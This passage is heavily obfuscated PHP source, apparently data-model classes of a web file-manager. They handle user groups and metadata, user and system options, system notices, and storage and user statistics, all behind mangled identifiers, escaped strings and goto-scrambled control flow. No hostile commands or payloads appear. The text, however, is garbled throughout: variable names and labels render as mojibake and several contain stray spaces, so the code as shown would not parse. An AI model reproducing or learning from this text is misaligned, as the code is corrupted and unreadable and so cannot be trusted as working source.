$C©Øìòº–Œ[1440]); goto aÆğÒ¡ö; aÆğÒ¡ö: $E¾â´Ü“Æ» = $this->where(array($C©Øìòº–Œ[1431] => array($C©Øìòº–Œ[7], $fçƒÓ™Üó)))->select(); if (!$E¾â´Ü“Æ») { return array(); } return $E¾â´Ü“Æ»; goto fê‡Ñ†™Ù; fê‡Ñ†™Ù: } private function _listDataApplyItem($aŒë·Œãàì) { $DÛ³ÊÁ÷¯¡ = array($aŒë·Œãàì); $this->_listDataApply($DÛ³ÊÁ÷¯¡); return $DÛ³ÊÁ÷¯¡[0]; } private function _listDataApply(&$AËè™œÕÈ½) { goto f£§ŞÀÍ±; cÊŠ­·ö„: $D²¸¾³„ = array_to_keyvalue($AËè™œÕÈ½, $e‘àñ”×‰[33], $e‘àñ”×‰[1440]); $this->_listAppendGroup($AËè™œÕÈ½, $D²¸¾³„); $this->_listAppendMeta($AËè™œÕÈ½, $D²¸¾³„); goto C·®çùÂßº; f£§ŞÀÍ±: $e‘àñ”×‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$AËè™œÕÈ½) { return; } array_remove_key($AËè™œÕÈ½, $e‘àñ”×‰[808]); goto cÊŠ­·ö„; C·®çùÂßº: $this->_listAppendSourceRoot($AËè™œÕÈ½, $D²¸¾³„); goto dÉ¬Œ‘œØ‹; dÉ¬Œ‘œØ‹: } private function _listAppendSourceRoot(&$eÏÈ—ï–“ø, $C¼¿µ‡¶¥Ç) { goto E„‰Õ•ë‰œ; D­ä‚Ú¢¼´: foreach ($eÏÈ—ï–“ø as &$AöåÛÓ†Éà) { $AöåÛÓ†Éà[$fìŠµ››’š[399]] = $b Œ¤Ş¨•Ÿ[$AöåÛÓ†Éà[$fìŠµ››’š[1440]]] ? $b Œ¤Ş¨•Ÿ[$AöåÛÓ†Éà[$fìŠµ››’š[1440]]] : array(); } goto aÉ“ë Â‚³; eÄÆÊ·µ’·: $b Œ¤Ş¨•Ÿ = Model($fìŠµ››’š[766])->order($fìŠµ››’š[2194])->field($d¸‰óŸ…ßß)->where($f¸Ê¥„Œè¡)->select(); $b Œ¤Ş¨•Ÿ = array_to_keyvalue($b Œ¤Ş¨•Ÿ, $fìŠµ››’š[464]); $b Œ¤Ş¨•Ÿ = array_remove_key($b Œ¤Ş¨•Ÿ, $fìŠµ››’š[464]); goto D­ä‚Ú¢¼´; E„‰Õ•ë‰œ: $fìŠµ››’š =& $_SERVER[¶ªÕß‚ØÁŸ]; $f¸Ê¥„Œè¡ = array($fìŠµ››’š[469] => 0, $fìŠµ››’š[379] => SourceModel::TYPE_USER, $fìŠµ››’š[464] => array($fìŠµ››’š[7], $C¼¿µ‡¶¥Ç)); $d¸‰óŸ…ßß = $fìŠµ››’š[2193]; goto eÄÆÊ·µ’·; aÉ“ë Â‚³: } private function _listAppendGroup(&$CÁ¤ÆÔĞšÄ, $Aï†áÕ¡ÕŞ) { goto b»— –í¸“; f‹ÃÖ´’ĞÊ: $C„Èİ¯¹òç = array_to_keyvalue_group($C„Èİ¯¹òç, $eã‰ÊÙÚÖï[1440]); foreach ($C„Èİ¯¹òç as &$d®ËÊë¾Ü‡) { $E»‰ßçì¸‚ = array(); foreach ($d®ËÊë¾Ü‡ as $a‡ËÏˆ¶Ú) { if (!$a‡ËÏˆ¶Ú[$eã‰ÊÙÚÖï[2235]]) { continue; } $fÚÌ«†º¢¢ = Model($eã‰ÊÙÚÖï[2254])->listData($a‡ËÏˆ¶Ú[$eã‰ÊÙÚÖï[2235]]); $E»‰ßçì¸‚[] = array($eã‰ÊÙÚÖï[2107] => $a‡ËÏˆ¶Ú[$eã‰ÊÙÚÖï[2107]], $eã‰ÊÙÚÖï[2544] => $eÎÇÛÃù—·[$a‡ËÏˆ¶Ú[$eã‰ÊÙÚÖï[2107]]], $eã‰ÊÙÚÖï[384] => $fÚÌ«†º¢¢); } $d®ËÊë¾Ü‡ = $E»‰ßçì¸‚; } foreach ($CÁ¤ÆÔĞšÄ as &$DÛ³„µŠÄÈ) { $DÛ³„µŠÄÈ[$eã‰ÊÙÚÖï[2540]] = array(); if (isset($C„Èİ¯¹òç[$DÛ³„µŠÄÈ[$eã‰ÊÙÚÖï[1440]]])) { $DÛ³„µŠÄÈ[$eã‰ÊÙÚÖï[2540]] = $C„Èİ¯¹òç[$DÛ³„µŠÄÈ[$eã‰ÊÙÚÖï[1440]]]; } } goto D®ØÌ„ôá; e¸óŒŠ÷ã : $Aá‹Õùçö = array_to_keyvalue($C„Èİ¯¹òç, $eã‰ÊÙÚÖï[33], $eã‰ÊÙÚÖï[2107]); $Aá‹Õùçö = array_remove_value(array_unique($Aá‹Õùçö), $eã‰ÊÙÚÖï[476]); if (!$Aá‹Õùçö || !$C„Èİ¯¹òç) { return; } goto EÏÌßÊ‹; b»— –í¸“: $eã‰ÊÙÚÖï =& $_SERVER[¶ªÕß‚ØÁŸ]; $dí»Ñ¦ŞÆæ = array($eã‰ÊÙÚÖï[1440] => array($eã‰ÊÙÚÖï[7], $Aï†áÕ¡ÕŞ)); $C„Èİ¯¹òç = Model($eã‰ÊÙÚÖï[2181])->where($dí»Ñ¦ŞÆæ)->select(); goto e¸óŒŠ÷ã ; EÏÌßÊ‹: $dí»Ñ¦ŞÆæ = array($eã‰ÊÙÚÖï[2107] => array($eã‰ÊÙÚÖï[7], $Aá‹Õùçö)); $C¼ÓŸ¸öÍÑ = Model($eã‰ÊÙÚÖï[2542])->field($eã‰ÊÙÚÖï[2543])->where($dí»Ñ¦ŞÆæ)->select(); $eÎÇÛÃù—· = array_to_keyvalue($C¼ÓŸ¸öÍÑ, $eã‰ÊÙÚÖï[2107], $eã‰ÊÙÚÖï[28]); goto f‹ÃÖ´’ĞÊ; D®ØÌ„ôá: } private function _listAppendMeta(&$AÔ»®º·ØÔ, $fî–»¾Ïä¸) { goto f´Ü°Óö–á; f´Ü°Óö–á: $a¯‡‰÷ŞóÛ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÍõŸ«„‚ = UserJobModel::JOB_KEY; $B¤†Óó¢ = array($a¯‡‰÷ŞóÛ[2522]); goto E‡½Š·Ö†Î; E‡½Š·Ö†Î: $a¿â³ò¥º = array($a¯‡‰÷ŞóÛ[1440] => array($a¯‡‰÷ŞóÛ[7], $fî–»¾Ïä¸)); $Fô–Ú¹ğ¢ = Model($a¯‡‰÷ŞóÛ[2519])->where($a¿â³ò¥º)->select(); $Fô–Ú¹ğ¢ = array_to_keyvalue_group($Fô–Ú¹ğ¢, $a¯‡‰÷ŞóÛ[1440]); goto b  ¢Ğ»ÖÀ; b  ¢Ğ»ÖÀ: foreach ($Fô–Ú¹ğ¢ as &$bØ‹•›é•) { $DÔˆ‘ô¦“Ä = array(); foreach ($bØ‹•›é• as $Bï¬¡í¢‰˜) { if (!in_array($Bï¬¡í¢‰˜[$a¯‡‰÷ŞóÛ[99]], $B¤†Óó¢)) { $DÔˆ‘ô¦“Ä[$Bï¬¡í¢‰˜[$a¯‡‰÷ŞóÛ[99]]] = $Bï¬¡í¢‰˜[$a¯‡‰÷ŞóÛ[368]]; } } $bØ‹•›é• = $DÔˆ‘ô¦“Ä; } $B£ÓŒÓ˜æÍ = Model($a¯‡‰÷ŞóÛ[2545]); foreach ($AÔ»®º·ØÔ as &$dëË¬×åŒ¶) { $aÆëÉô¦Â¬ = array(); if (isset($Fô–Ú¹ğ¢[$dëË¬×åŒ¶[$a¯‡‰÷ŞóÛ[1440]]])) { $aÆëÉô¦Â¬ = $Fô–Ú¹ğ¢[$dëË¬×åŒ¶[$a¯‡‰÷ŞóÛ[1440]]]; } $dëË¬×åŒ¶[$a¯‡‰÷ŞóÛ[2546]] = array(); if (isset($aÆëÉô¦Â¬[$FÍõŸ«„‚])) { $dëË¬×åŒ¶[$a¯‡‰÷ŞóÛ[2546]] = $B£ÓŒÓ˜æÍ->getUserJobInfo($aÆëÉô¦Â¬[$FÍõŸ«„‚]); } } goto D×“ÙŒ­¦Í; D×“ÙŒ­¦Í: } public function userSearch($DîÔŸêóğÃ, $Cë‚õ“âß‡ = "\52") { return Model($_SERVER[¶ªÕß‚ØÁŸ][485])->where($DîÔŸêóğÃ)->field($Cë‚õ“âß‡)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\x5f\157\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($a×´ó‹®Ğ‹) { $AóÃÔˆ£ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!defined($AóÃÔˆ£ˆ[435])) { define($AóÃÔˆ£ˆ[435], 0); } return "\125\x73\145\162\x4f\160\164\x69\x6f\x6e\x5f{$a×´ó‹®Ğ‹}\137" . USER_ID; } protected function filterWhere($C‹ìÑÜšô…) { $FˆÔïÈí…Â =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!defined($FˆÔïÈí…Â[435])) { define($FˆÔïÈí…Â[435], 0); } $C‹ìÑÜšô…[$FˆÔïÈí…Â[1440]] = USER_ID; return $C‹ìÑÜšô…; } public function cacheRemoveUser($BŒ×ŞÓï÷Ê, $d»†›öµ) { return Cache::remove("\125\163\x65\x72\117\160\x74\x69\157\x6e\137{$BŒ×ŞÓï÷Ê}\137" . $d»†›öµ); } protected function optionDefault($EèÌ›ÄëÌÄ = '') { $fÑôÔÂİáª =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($EèÌ›ÄëÌÄ == $fÑôÔÂİáª[33]) { return $GLOBALS[$fÑôÔÂİáª[6]][$fÑôÔÂİáª[2547]]; } if ($EèÌ›ÄëÌÄ == $fÑôÔÂİáª[2548]) { return $GLOBALS[$fÑôÔÂİáª[6]][$fÑôÔÂİáª[2549]]; } } } goto EÂé»’†Úƒ; AÆŸõ‘–»: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x6e\157\x74\x69\143\145\114\x69\163\164"; public $field = array("\156\x61\155\145", "\143\157\x6e\x74\145\156\x74", "\141\165\164\x68", "\155\x6f\144\x65", "\x74\151\x6d\145", "\164\x79\x70\145", "\x6c\x65\166\145\154", "\145\x6e\x61\x62\154\145", "\x73\157\162\164"); public function listData($e•éŒ’Ìˆ = false, $DåŒª„åƒ÷ = "\x73\x6f\x72\x74", $AÙğÀ®êÂ = false) { return parent::listData($e•éŒ’Ìˆ, $DåŒª„åƒ÷, $AÙğÀ®êÂ); } public function add($eœîêêìÄµ) { $Dù¡ª¹Ø–½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F£À¡ó¶ã¨ = time(); if ($eœîêêìÄµ[$Dù¡ª¹Ø–½[12]] == $Dù¡ª¹Ø–½[2482]) { $F£À¡ó¶ã¨ = strtotime($eœîêêìÄµ[$Dù¡ª¹Ø–½[200]]); } $eœîêêìÄµ[$Dù¡ª¹Ø–½[200]] = $F£À¡ó¶ã¨; return parent::insert($eœîêêìÄµ); } public function update($EÀê…ï¥¾ƒ, $f²”¼ÜÑ©) { goto b‰©¹–óÅç; b‰©¹–óÅç: $B‘ƒ°Ï¥•™ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EŠ‰éÊÂ£ö = $this->listData($EÀê…ï¥¾ƒ); if (!$EŠ‰éÊÂ£ö) { return !1; } goto Eš©íÙŒ; Cœ†ä³Ì¢è: return parent::update($EÀê…ï¥¾ƒ, $f²”¼ÜÑ©); goto CôÙçˆÜ¦¨; Eš©íÙŒ: $a”ŠË½Ò¿ = time(); if ($f²”¼ÜÑ©[$B‘ƒ°Ï¥•™[12]] == $B‘ƒ°Ï¥•™[2482]) { $a”ŠË½Ò¿ = strtotime($f²”¼ÜÑ©[$B‘ƒ°Ï¥•™[200]]); } $f²”¼ÜÑ©[$B‘ƒ°Ï¥•™[200]] = $a”ŠË½Ò¿; goto Cœ†ä³Ì¢è; CôÙçˆÜ¦¨: } public function remove($béŠÃéßã) { $c¤Ğ×„öÅ = $this->listData($béŠÃéßã); if (!$c¤Ğ×„öÅ || $c¤Ğ×„öÅ[$_SERVER[¶ªÕß‚ØÁŸ][1084]]) { return !1; } return parent::remove($béŠÃéßã); } public function sort($eÔ¹ÅòÆÄ, $cÛà˜ôÜæ÷) { return parent::update($eÔ¹ÅòÆÄ, $cÛà˜ôÜæ÷); } public function enable($B¯¾¿¬“Ÿ¼, $ašáŠ—’¼Ì) { return parent::update($B¯¾¿¬“Ÿ¼, array($_SERVER[¶ªÕß‚ØÁŸ][2483] => $ašáŠ—’¼Ì)); } private function initUserOption() { $A™×‰”ø½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->optionType = $A™×‰”ø½[2484]; $this->modelType = $A™×‰”ø½[2485]; $this->field = array($A™×‰”ø½[2486], $A™×‰”ø½[28], $A™×‰”ø½[200], $A™×‰”ø½[29], $A™×‰”ø½[2487], $A™×‰”ø½[702], $A™×‰”ø½[193]); } public function userNoticeGet($bÏÈŸñƒïˆ = false) { $this->initUserOption(); return parent::listData($bÏÈŸñƒïˆ, $_SERVER[¶ªÕß‚ØÁŸ][375], !0); } public function userNoticeAdd($C¡š¹¢ñíÆ) { $CÔ¦œÒá½š =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initUserOption(); $a–ÍÊæ ƒ = $this->findByKey($CÔ¦œÒá½š[2486], $C¡š¹¢ñíÆ[$CÔ¦œÒá½š[375]]); if ($a–ÍÊæ ƒ) { return !0; } $bï²Ö¾ˆÄ» = array($CÔ¦œÒá½š[2486] => $C¡š¹¢ñíÆ[$CÔ¦œÒá½š[375]], $CÔ¦œÒá½š[28] => $C¡š¹¢ñíÆ[$CÔ¦œÒá½š[28]], $CÔ¦œÒá½š[200] => $C¡š¹¢ñíÆ[$CÔ¦œÒá½š[200]], $CÔ¦œÒá½š[29] => isset($C¡š¹¢ñíÆ[$CÔ¦œÒá½š[29]]) ? $C¡š¹¢ñíÆ[$CÔ¦œÒá½š[29]] : 1, $CÔ¦œÒá½š[2487] => isset($C¡š¹¢ñíÆ[$CÔ¦œÒá½š[2487]]) ? $C¡š¹¢ñíÆ[$CÔ¦œÒá½š[2487]] : 0, $CÔ¦œÒá½š[702] => 0, $CÔ¦œÒá½š[193] => 0); return parent::insert($bï²Ö¾ˆÄ»); } public function userNoticeEdit($CÓÕîšï‚Ä, $BÏŒ¥ Š†) { $this->initUserOption(); return parent::update($CÓÕîšï‚Ä, $BÏŒ¥ Š†); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\155\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\162\157\154\x65", "\x72\157\x6c\145\107\x72\x6f\165\160", "\162\145\x67\x69\163\x74", "\145\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($eïì¿›İÒ“) { return "\x53\171\x73\x74\145\x6d\x4f\160\x74\151\157\156\x5f{$eïì¿›İÒ“}"; } protected function optionDefault($DÔŒéîã­ò = '') { $aŠ•¤š¯¨Õ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($DÔŒéîã­ò == $aŠ•¤š¯¨Õ[33]) { return $GLOBALS[$aŠ•¤š¯¨Õ[6]][$aŠ•¤š¯¨Õ[2488]]; } } } class SystemRecordModel extends ModelBaseLight { } goto c£Œ¯š§¹; FòØ«Äå‰Õ: class AnalysisModel extends ModelBaseLight { public function init($cœ–¬«ë) { $a£œƒÈºƒğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d¶¼¥‹Äò = array($a£œƒÈºƒğ[543] => array($a£œƒÈºƒğ[29] => $a£œƒÈºƒğ[2033], $a£œƒÈºƒğ[270] => array($a£œƒÈºƒğ[220], $a£œƒÈºƒğ[713], $a£œƒÈºƒğ[2034], $a£œƒÈºƒğ[2035])), $a£œƒÈºƒğ[2036] => array($a£œƒÈºƒğ[29] => $a£œƒÈºƒğ[2037], $a£œƒÈºƒğ[270] => array($a£œƒÈºƒğ[220], $a£œƒÈºƒğ[711], $a£œƒÈºƒğ[2038], $a£œƒÈºƒğ[2039], $a£œƒÈºƒğ[2040]))); if (!isset($d¶¼¥‹Äò[$cœ–¬«ë])) { return !1; } $this->optionType = $d¶¼¥‹Äò[$cœ–¬«ë][$a£œƒÈºƒğ[29]]; $this->field = $d¶¼¥‹Äò[$cœ–¬«ë][$a£œƒÈºƒğ[270]]; return !0; } public function listData($bŒÕÂäŞ¹ö = false, $d‰‘ï²õÌÅ = "\155\x6f\x64\x69\x66\x79\124\x69\155\x65", $E¿ˆ†³ÏĞÓ = false) { return parent::listData($bŒÕÂäŞ¹ö, $d‰‘ï²õÌÅ, $E¿ˆ†³ÏĞÓ); } public function trendList($bÆ££å‚ù) { goto fÉ„œ±ã¯›; a©•äŸ´ºí: if (!isset($C—ğˆ§œ¹)) { $cØ§‰ß·ò¾ = $bÆ££å‚ù == $f®ª„¦óÅ±[543] ? $f®ª„¦óÅ±[485] : $f®ª„¦óÅ±[766]; $C—ğˆ§œ¹ = Model($cØ§‰ß·ò¾)->min($f®ª„¦óÅ±[197]); } $E¢–á®ØÆÆ = $f®ª„¦óÅ±[2043] . ucfirst($bÆ££å‚ù); $a£¿Å’£ĞÀ = $this->dateList($C—ğˆ§œ¹); goto Aİá‚„à¹; Aİá‚„à¹: foreach ($a£¿Å’£ĞÀ as $Bòáêï‚²) { $this->{$E¢–á®ØÆÆ}($Bòáêï‚²); } return $this->listData(); goto cØÓÓ°Éë; fÉ„œ±ã¯›: $f®ª„¦óÅ± =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÜ¼¾¦îí = $this->listData(); if ($AÜ¼¾¦îí) { $BÊíµà¿§ = end($AÜ¼¾¦îí); $Bòáêï‚² = date($f®ª„¦óÅ±[2041], strtotime($f®ª„¦óÅ±[2042])); if ($BÊíµà¿§[$f®ª„¦óÅ±[220]] == $Bòáêï‚²) { return $AÜ¼¾¦îí; } $C—ğˆ§œ¹ = strtotime($BÊíµà¿§[$f®ª„¦óÅ±[220]]); } goto a©•äŸ´ºí; cØÓÓ°Éë: } private function dateList($A”¶‚Š¸ßœ) { $Béâ™Ì…’ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cİôã¢ùŸ‚ = $A”¶‚Š¸ßœ; $E‰‹Ÿ§Š—Ö = strtotime($Béâ™Ì…’[2042]); $CÍáô…»’ù = array(); while ($Cİôã¢ùŸ‚ <= $E‰‹Ÿ§Š—Ö) { $CÍáô…»’ù[] = date($Béâ™Ì…’[2041], $Cİôã¢ùŸ‚); $Cİôã¢ùŸ‚ = strtotime($Béâ™Ì…’[2044], $Cİôã¢ùŸ‚); } return $CÍáô…»’ù; } public function _recordUser($Aå£ß²øëÈ = '') { goto bøƒÒÌõÒå; F»Ú™‰õÜ: $EàôÔî²‡¹ = Model($fÍí‘æ„[485])->where($c¥¶Áèî)->count($fÍí‘æ„[1440]); $c¥¶Áèî[$fÍí‘æ„[29]] = $fÍí‘æ„[2047]; $fÇ›¡­ª¹æ = Model($fÍí‘æ„[2048])->where($c¥¶Áèî)->count($fÍí‘æ„[2049]); goto b¢åã×É¸İ; E ¦Šğ•É¨: $c¥¶Áèî = array($fÍí‘æ„[197] => array($fÍí‘æ„[933], $DÓ£Ç»â¯)); $FÒˆ„÷â¬Ê = Model($fÍí‘æ„[485])->where($c¥¶Áèî)->count($fÍí‘æ„[1440]); $c¥¶Áèî[$fÍí‘æ„[197]] = array($fÍí‘æ„[330], array($cº÷¸ÓĞ¨é, $DÓ£Ç»â¯)); goto F»Ú™‰õÜ; b¢åã×É¸İ: $a„—Õ•ÕÙ = array($fÍí‘æ„[220] => $Aå£ß²øëÈ, $fÍí‘æ„[713] => (int) $FÒˆ„÷â¬Ê, $fÍí‘æ„[2034] => (int) $EàôÔî²‡¹, $fÍí‘æ„[2035] => (int) $fÇ›¡­ª¹æ); return $this->insert($a„—Õ•ÕÙ); goto CÃ¶Ì¶Ç¥; bøƒÒÌõÒå: $fÍí‘æ„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cº÷¸ÓĞ¨é = strtotime(date($fÍí‘æ„[2045], strtotime($Aå£ß²øëÈ))); $DÓ£Ç»â¯ = strtotime(date($fÍí‘æ„[2046], strtotime($Aå£ß²øëÈ))); goto E ¦Šğ•É¨; CÃ¶Ì¶Ç¥: } public function _recordStore($bö‹ß ¿ÑŞ = '') { goto aõÜÊÅŞáš; E¢è¥ƒÔ¸æ: $aĞ·Â·²ò[$d½·†è ‰«[379]] = 1; $A½¾…Ó™ = Model($d½·†è ‰«[766])->where($aĞ·Â·²ò)->sum($d½·†è ‰«[87]); $aĞ·Â·²ò[$d½·†è ‰«[379]] = 2; goto cƒ¨ê³¦ò; CßªîÒÚò: $EİÔÀ ´ç— = Model($d½·†è ‰«[430])->where($aĞ·Â·²ò)->sum($d½·†è ‰«[87]); $aĞ·Â·²ò[$d½·†è ‰«[378]] = 0; $cÛáÙ® Ë = Model($d½·†è ‰«[766])->where($aĞ·Â·²ò)->sum($d½·†è ‰«[87]); goto E¢è¥ƒÔ¸æ; aõÜÊÅŞáš: $d½·†è ‰« =& $_SERVER[¶ªÕß‚ØÁŸ]; $E×š·ùØ¢¥ = strtotime(date($d½·†è ‰«[2046], strtotime($bö‹ß ¿ÑŞ))); $aĞ·Â·²ò = array($d½·†è ‰«[197] => array($d½·†è ‰«[933], $E×š·ùØ¢¥)); goto CßªîÒÚò; cƒ¨ê³¦ò: $a±­¶¡ÖŸ± = Model($d½·†è ‰«[766])->where($aĞ·Â·²ò)->sum($d½·†è ‰«[87]); $AƒĞ…åè… = array($d½·†è ‰«[220] => $bö‹ß ¿ÑŞ, $d½·†è ‰«[711] => (int) $cÛáÙ® Ë, $d½·†è ‰«[2038] => (int) $EİÔÀ ´ç—, $d½·†è ‰«[2039] => (int) $A½¾…Ó™, $d½·†è ‰«[2040] => (int) $a±­¶¡ÖŸ±); return $this->insert($AƒĞ…åè…); goto Eœã“™š’; Eœã“™š’: } public function trend($e¨¹¶Ÿï†ë, $eå‚ÂªÉ­È) { goto d™Äˆåò‘; dÕ†«¤æªŠ: if (empty($a³¬••óä­)) { $a²¡ôˆ±Æ = date($e»£§‚Õ[2041], strtotime($e»£§‚Õ[2042])); $f®Ÿ²š¯£É = array($e»£§‚Õ[220] => $a²¡ôˆ±Æ); foreach ($f©¥‘à¿Ù·[$e¨¹¶Ÿï†ë] as $CˆÖÔó†ì => $aõòÇ´‰Ô) { $f®Ÿ²š¯£É[$CˆÖÔó†ì] = 0; } $a³¬••óä­[] = $f®Ÿ²š¯£É; } $B˜¡¼Š©¡° = array(); foreach ($a³¬••óä­ as $aõòÇ´‰Ô) { if ($e¨¹¶Ÿï†ë == $e»£§‚Õ[2036] && $aõòÇ´‰Ô[$e»£§‚Õ[2038]] > $aõòÇ´‰Ô[$e»£§‚Õ[711]]) { $aõòÇ´‰Ô[$e»£§‚Õ[2038]] = $aõòÇ´‰Ô[$e»£§‚Õ[711]]; } foreach ($f©¥‘à¿Ù·[$e¨¹¶Ÿï†ë] as $CˆÖÔó†ì => $BºëöšŸ½·) { $BäÆàöÉ¥£ = array($e»£§‚Õ[220] => $aõòÇ´‰Ô[$e»£§‚Õ[220]], $e»£§‚Õ[1346] => $BºëöšŸ½·); $BäÆàöÉ¥£[$BÎ™ì—Â‡[$e¨¹¶Ÿï†ë]] = isset($aõòÇ´‰Ô[$CˆÖÔó†ì]) ? $aõòÇ´‰Ô[$CˆÖÔó†ì] : 0; $B˜¡¼Š©¡°[] = $BäÆàöÉ¥£; } } goto cÒ˜–¨ÉÚŸ; FµÏ§»·²: if ($a³¬••óä­ && $eå‚ÂªÉ­È != $e»£§‚Õ[1415]) { $Fß„™ŒÛá = $a³¬••óä­[0][$e»£§‚Õ[220]]; $cÒ¢’œÒ¥ = $this->validDate($eå‚ÂªÉ­È, $Fß„™ŒÛá); $d¨¯ŸÙ…ì† = array(); $D·õÊôŠ–¸ = array_to_keyvalue($a³¬••óä­, $e»£§‚Õ[220]); foreach ($cÒ¢’œÒ¥ as $a²¡ôˆ±Æ) { if (isset($D·õÊôŠ–¸[$a²¡ôˆ±Æ])) { $BäÆàöÉ¥£ = $D·õÊôŠ–¸[$a²¡ôˆ±Æ]; } else { $BäÆàöÉ¥£ = end($a³¬••óä­); $BäÆàöÉ¥£[$e»£§‚Õ[220]] = $a²¡ôˆ±Æ; if ($e¨¹¶Ÿï†ë == $e»£§‚Õ[543]) { $BäÆàöÉ¥£[$e»£§‚Õ[2034]] = $BäÆàöÉ¥£[$e»£§‚Õ[2035]] = 0; } } $d¨¯ŸÙ…ì†[] = $BäÆàöÉ¥£; } $a³¬••óä­ = $d¨¯ŸÙ…ì†; } $f©¥‘à¿Ù· = array($e»£§‚Õ[543] => array($e»£§‚Õ[713] => LNG($e»£§‚Õ[2050]), $e»£§‚Õ[2034] => LNG($e»£§‚Õ[2051]), $e»£§‚Õ[2035] => LNG($e»£§‚Õ[2052])), $e»£§‚Õ[2036] => array($e»£§‚Õ[711] => LNG($e»£§‚Õ[2053]), $e»£§‚Õ[2038] => LNG($e»£§‚Õ[2054]), $e»£§‚Õ[2039] => LNG($e»£§‚Õ[2055]), $e»£§‚Õ[2040] => LNG($e»£§‚Õ[2056]))); $BÎ™ì—Â‡ = array($e»£§‚Õ[543] => $e»£§‚Õ[2057], $e»£§‚Õ[2036] => $e»£§‚Õ[87]); goto dÕ†«¤æªŠ; cÒ˜–¨ÉÚŸ: return $B˜¡¼Š©¡°; goto e§—šÂåğâ; d™Äˆåò‘: $e»£§‚Õ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->init($e¨¹¶Ÿï†ë)) { return !1; } $a³¬••óä­ = $this->trendList($e¨¹¶Ÿï†ë); goto FµÏ§»·²; e§—šÂåğâ: } public function validDate($dÄËÓ½Áˆ©, $fĞÄ Ú––) { goto CÓğÔœŸø; CÓğÔœŸø: $bÆ‘™»ç–ò =& $_SERVER[¶ªÕß‚ØÁŸ]; $F÷ô—îğ = date($bÆ‘™»ç–ò[2041], strtotime($bÆ‘™»ç–ò[2042])); $a×œùîæìö = array($F÷ô—îğ); goto DƒåÇØÓĞº; eïº£öĞ¿Ñ: return $a×œùîæìö; goto e…×Ë´; DƒåÇØÓĞº: switch ($dÄËÓ½Áˆ©) { case $bÆ‘™»ç–ò[1422]: $f—Èø”é”‚ = mktime(0, 0, 0, date($bÆ‘™»ç–ò[2058]), date($bÆ‘™»ç–ò[2059]) - date($bÆ‘™»ç–ò[1229]) + 7 - 7, date($bÆ‘™»ç–ò[2060])); $f ÌšˆÑ›à = 0; do { $CŠèòÇìô• = date($bÆ‘™»ç–ò[2041], $f—Èø”é”‚ - 3600 * 24 * 7 * $f ÌšˆÑ›à); $a×œùîæìö[] = $CŠèòÇìô•; $f ÌšˆÑ›à++; } while ($fĞÄ Ú–– < $CŠèòÇìô•); break; case $bÆ‘™»ç–ò[1420]: $f ÌšˆÑ›à = 1; do { $F¿Î¥Œ‰ß” = date($bÆ‘™»ç–ò[2061], strtotime("\x2d\40{$f ÌšˆÑ›à}\x20\x6d\157\156\x74\150\163")); $a×œùîæìö[] = $F¿Î¥Œ‰ß”; $f ÌšˆÑ›à++; } while ($fĞÄ Ú–– < $F¿Î¥Œ‰ß”); break; case $bÆ‘™»ç–ò[1729]: $aİ²¡ŒŞà­ = (int) date($bÆ‘™»ç–ò[2060], strtotime($fĞÄ Ú––)); $Fƒ–ƒĞÄ‚ = (int) date($bÆ‘™»ç–ò[2060]); if ($aİ²¡ŒŞà­ >= $Fƒ–ƒĞÄ‚) { break; } for ($aİ²¡ŒŞà­; $aİ²¡ŒŞà­ < $Fƒ–ƒĞÄ‚; $aİ²¡ŒŞà­++) { $a×œùîæìö[] = $aİ²¡ŒŞà­ . $bÆ‘™»ç–ò[2062]; } break; default: break; } if ($fĞÄ Ú–– > end($a×œùîæìö)) { array_pop($a×œùîæìö); } sort($a×œùîæìö); goto eïº£öĞ¿Ñ; e…×Ë´: } public function listTable($BÜƒ…Ï¹Ùš) { $b†èº„‡í = ucfirst($BÜƒ…Ï¹Ùš); return Model($b†èº„‡í)->listData(); } public function option($BøÛ‚Ç©‰ˆ) { $B»Œö‹á©Ú = $_SERVER[¶ªÕß‚ØÁŸ][2063] . ucfirst($BøÛ‚Ç©‰ˆ); return $this->{$B»Œö‹á©Ú}(); } private function optionUser() { goto e¤ËÏ¹·Š; F•Œ©­ò‡Ã: $bìº§ŠÍ¶Æ = strtotime($b÷¸ê÷³–[2065]); $CŞãßï•ÑÕ = array($b÷¸ê÷³–[2066] => array($b÷¸ê÷³–[934], $bìº§ŠÍ¶Æ)); $E¨¯²ÕÂèÄ = (int) Model($b÷¸ê÷³–[485])->where($CŞãßï•ÑÕ)->count($b÷¸ê÷³–[1440]); goto b·º‡„ŒÚ¥; AÛŠ½ ÒŠ»: $d´å±ÔÏ… = Model($b÷¸ê÷³–[485])->where($CŞãßï•ÑÕ)->count($b÷¸ê÷³–[1440]); return array($b÷¸ê÷³–[708] => (int) $BˆÂ›İµõÓ, $b÷¸ê÷³–[2067] => (int) ($BˆÂ›İµõÓ - $bˆËçÑè£İ), $b÷¸ê÷³–[2068] => (int) $bˆËçÑè£İ, $b÷¸ê÷³–[2069] => (int) $d´å±ÔÏ…, $b÷¸ê÷³–[2070] => $E¨¯²ÕÂèÄ); goto a¶—ŒÃ¾; e¤ËÏ¹·Š: $b÷¸ê÷³– =& $_SERVER[¶ªÕß‚ØÁŸ]; $BˆÂ›İµõÓ = Model($b÷¸ê÷³–[485])->count($b÷¸ê÷³–[1440]); $bˆËçÑè£İ = Model($b÷¸ê÷³–[485])->where($b÷¸ê÷³–[2064])->count($b÷¸ê÷³–[1440]); goto F•Œ©­ò‡Ã; 